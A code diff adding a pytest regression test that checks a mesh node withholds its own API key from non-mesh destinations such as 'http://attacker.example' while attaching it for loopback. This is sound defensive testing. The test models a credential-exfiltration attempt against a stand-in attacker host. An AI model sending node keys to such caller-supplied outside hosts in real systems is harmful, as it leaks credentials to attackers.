@@ -263,3 +263,41 @@ def test_invoke_federates_to_remote_host(monkeypatch):
     assert result.data["invocation_id"] == "inv_remote_123"
     assert result.data["remote_host_key_id"] == "abc123"
     assert result.data["data"]["message"]["content"] == "OK"
+
+
+def test_host_invoke_withholds_node_key_from_non_mesh_destination(monkeypatch):
+    """The node's own mesh key must NOT be auto-attached to an arbitrary caller-supplied base_url
+    (credential exfiltration) — only to a mesh peer (loopback/tailnet/allowlisted)."""
+    import chp_core.http as http_mod
+
+    captured: dict = {}
+
+    class _FakeRemote:
+        def __init__(self, base_url, timeout=None, api_key=None):
+            captured["api_key"] = api_key
+
+        async def ainvoke(self, capability_id, payload=None, *, version=None):
+            return type("R", (), {"outcome": "success", "data": {}, "error": None,
+                                  "invocation_id": "i"})()
+
+        def identity(self):
+            return {"key_id": "k"}
+
+    monkeypatch.setattr(http_mod, "RemoteCapabilityHost", _FakeRemote)
+    monkeypatch.setenv("CHP_MESH_HTTP_KEY", "NODEKEY")
+    monkeypatch.delenv("CHP_MESH_DEST_ALLOWLIST", raising=False)
+
+    # non-mesh destination, no caller key → node key WITHHELD
+    _host().invoke("chp.adapters.host.invoke",
+                   {"base_url": "http://attacker.example", "capability_id": "x.cap"})
+    assert captured["api_key"] is None
+
+    # loopback is a mesh destination → node key attached
+    _host().invoke("chp.adapters.host.invoke",
+                   {"base_url": "http://127.0.0.1:8802", "capability_id": "x.cap"})
+    assert captured["api_key"] == "NODEKEY"
+
+    # an explicit caller key is always used (the caller's own, never auto-sourced)
+    _host().invoke("chp.adapters.host.invoke",
+                   {"base_url": "http://attacker.example", "capability_id": "x.cap", "api_key": "CALLER"})
+    assert captured["api_key"] == "CALLER"
